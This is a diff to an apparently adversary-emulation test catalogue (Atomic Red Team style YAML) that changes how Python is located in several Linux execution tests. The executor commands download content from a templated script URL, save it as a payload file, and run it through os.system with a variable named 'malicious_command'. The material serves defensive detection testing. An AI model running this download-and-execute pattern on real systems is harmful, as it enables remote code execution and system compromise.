@@ -63234,17 +63234,15 @@ execution:
       - description: Verify if python is in the environment variable path and attempt
           to import requests library.
         prereq_command: |
-          which_python=`which python`; python -V
+          which_python=$(which python || which python3 || which python2); $which_python -V
           $which_python -c 'import requests' 2>/dev/null; echo $?
         get_prereq_command: 'pip install requests
 
 '
       executor:
-        command: '$which_python -c ''import requests;import os;url = "#{script_url}";malicious_command
-          = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source
-          = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)''
-
-'
+        command: |
+          which_python=$(which python || which python3 || which python2)
+          $which_python -c 'import requests;import os;url = "#{script_url}";malicious_command = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
         name: sh
         cleanup_command: "rm #{payload_file_name}  \n"
     - name: Execute Python via scripts (Linux)
@@ -63282,11 +63280,12 @@ execution:
 
 '
         prereq_command: |
-          which_python=`which python`; python -V
+          which_python=$(which python || which python3 || which python2); $which_python -V
           $which_python -c 'import requests' 2>/dev/null; echo $?
         get_prereq_command: "pip install requests    \n"
       executor:
         command: |
+          which_python=$(which python || which python3 || which python2)
           echo 'import requests' > #{python_script_name}
           echo 'import os' >> #{python_script_name}
           echo 'url = "#{script_url}"' >> #{python_script_name}
@@ -63342,11 +63341,12 @@ execution:
 
 '
         prereq_command: |
-          which_python=`which python`; python -V
+          which_python=$(which python || which python3 || which python2); $which_python -V
           $which_python -c 'import requests' 2>/dev/null; echo $?
         get_prereq_command: "pip install requests    \n"
       executor:
         command: |
+          which_python=$(which python || which python3 || which python2)
           echo 'import requests' > #{python_script_name}
           echo 'import os' >> #{python_script_name}
           echo 'url = "#{script_url}"' >> #{python_script_name}
